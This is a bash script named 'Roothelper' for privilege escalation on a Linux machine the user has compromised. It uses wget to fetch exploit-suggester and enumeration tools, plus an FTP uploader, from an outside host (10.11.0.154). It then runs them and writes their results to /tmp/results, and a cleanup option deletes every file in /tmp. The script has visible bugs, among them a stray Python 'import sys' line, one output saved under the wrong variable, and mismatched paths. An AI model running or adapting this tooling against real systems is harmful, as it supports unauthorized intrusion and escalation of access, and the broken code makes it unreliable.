#!/bin/bash
import sys
function usage()
{ printf "%b \a\n\nRoothelper will aid in the process of privilege escalation on a Linux system you compromised by fetching a number of enumeration
and exploit suggestion scripts. Below is a quick overview of the available options.

The 'Help' option displays this informational message.

The 'Download' option fetches the relevant files and places them in the /tmp/ directory.

The option 'Download and unzip' downloads all files and extracts the contents of zip archives to their individual subdirectories respectively, please
note; if the 'mkdir' command is unavailable however, the operation will not succeed and the 'Download' option should be used instead

The 'Clean up' option removes all downloaded files and 'Quit' exits roothelper.\n "
}

# Download and unzip
function dzip()
{    echo "Downloading and extracting scripts..."
    `wget -O /tmp/ExploitSuggest.py http://10.11.0.154/tools/RootHelper/walkers/ExploitSuggest.py`
    `wget -O /tmp/LinEnum.zip http://10.11.0.154/tools/RootHelper/walkers/LinEnum.zip`                  
    `wget -O /tmp/ExploitSuggest_perl.zip http://10.11.0.154/tools/RootHelper/walkers/ExploitSuggest_perl.zip`  
    `wget -O /tmp/unixprivesc.zip http://10.11.0.154/tools/RootHelper/walkers/unixprivesc.zip`
    `wget -O /tmp/firmwalker.zip http://10.11.0.154/tools/RootHelper/walkers/firmwalker.zip`
    `wget -O /tmp/ftpFileUploader.py http://10.11.0.154/tools/RootHelper/tools/ftpFileUploader.py`
    for zip in *.zip
    do
        dirname=`echo $zip | sed 's/\.zip$//'`
        if mkdir $dirname
        then
            if cd $dirname
            then
                unzip ../$zip
                cd ..
                rm -f $zip
            else
                echo "Could not unpack $zip - cd failed"
            fi
        else
            echo "Could not unpack $zip - mkdir failed"
        fi
    done
}

dir="/tmp/"

usage

printf "%b" "\a\n\nTo use roothelper please select an option below.:\n"

PS3='Please enter your choice: '
options=("Help" "Download" "Download and unzip" "Execute and Redirect" "Clean up" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Help")
            usage
            printf "%b \n"
            ;;
        "Download")
            echo "Downloading scripts to /tmp/"
		`wget -O /tmp/ExploitSuggest.py http://10.11.0.154/tools/RootHelper/walkers/ExploitSuggest.py`
		`wget -O /tmp/LinEnum.zip http://10.11.0.154/tools/RootHelper/walkers/LinEnum.zip`                  
		`wget -O /tmp/ExploitSuggest_perl.zip http://10.11.0.154/tools/RootHelper/walkers/ExploitSuggest_perl.zip`  
		`wget -O /tmp/unixprivesc.zip http://10.11.0.154/tools/RootHelper/walkers/unixprivesc.zip`
		`wget -O /tmp/firmwalker.zip http://10.11.0.154/tools/RootHelper/walkers/firmwalker.zip`
		`wget -O /tmp/ftpFileUploader.py http://10.11.0.154/tools/RootHelper/tools/ftpFileUploader.py`
             printf "%b \n"
            ;;
        "Download and unzip")
            dzip
            printf "%b \n"
            ;;
        "Execute and Redirect")
            mkdir -p ./results
		if command -v python2 > /dev/null 2>&1; then
			echo "Running ExploitSuggest.py"
			output=$(python /tmp/ExploitSuggest.py)
			echo "$output" > /tmp/results/ExlploitSuggest.txt
			if [[ ! -z $output ]]; then
			    echo 'Finished ExploitSuggest.py Succesful!'
			else
			    echo 'Finished ExploitSuggest.py Failed!'
			fi
		else
		    echo "Not Running Exploit Suggestor python because no python could be found"
		fi

		if perl < /dev/null > /dev/null 2>&1  ; then
		      	echo yes we have perl on  PATH
			output2=$(perl /tmp/ExploitSuggest_perl/Linux_Exploit_Suggester-master/Linux_Exploit_Suggester.pl)
			echo "$output" > /tmp/results/Linux_Exploit_Suggester.txt
			if [[ ! -z $output2 ]]; then
			    echo 'Finished Linux_Exploit_Suggester.pl Succesful!'
			else
			    echo 'Finished ExploitSuggest.pl Failed!'
			fi
		else
		      	echo dang... no perl
			echo "Not Running Linux_Exploit_Suggester.pl perl because no perl could be found"
		fi

		

		output3=$(/tmp/firmwalker/firmwalker-master/firmwalker.sh)
		echo "$output3" > /tmp/results/firmwalker.txt
	        if [[ ! -z $output3 ]]; then
		    echo 'Finished firmwalker.sh (maybe) Succesful!'
		else
		    echo 'Finished firmwalker.sh (maybe) Failed!'
		fi
	
		output4=$(/tmp/LinEnum/LinEnum-master/LinEnum.sh)
		echo "$output4" > /tmp/results/LinEnum.txt
	        if [[ ! -z $output4 ]]; then
		    echo 'Finished LinEnum.sh Succesful!'
		else
		    echo 'Finished LinEnum.sh Failed!'
		fi 
		
		output5=$(/tmp/unix-privesc-check-1_x/unix-privesc-check standard)
		echo "$output5" > /tmp/results/unix-privesc-check-STANDARD.txt
	        if [[ ! -z $output5 ]]; then
		    echo 'Finished unix-privesc-check Succesful (Note this is only Standard MODE)!'
		else
		    echo 'Finished unix-privesc-check Failed!'
		fi
	
		output6=$(/tmp/unixprivesc/unix-privesc-check-1_x/unix-privesc-check detailed)
		echo "$output6" > /tmp/results/unix-privesc-check-DETAILED.txt
	        if [[ ! -z $output6 ]]; then
		    echo 'Finished unix-privesc-check Succesful (Note this is only detailed MODE)!'
		else
		    echo 'Finished unix-privesc-check Failed!'
		fi
	    printf "%b \n" 
            ;;
         "Clean up")
            echo "Removing downloaded files"
            find $dir/* -exec rm {} \;
            printf "%b \n"
            ;;
        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done
  
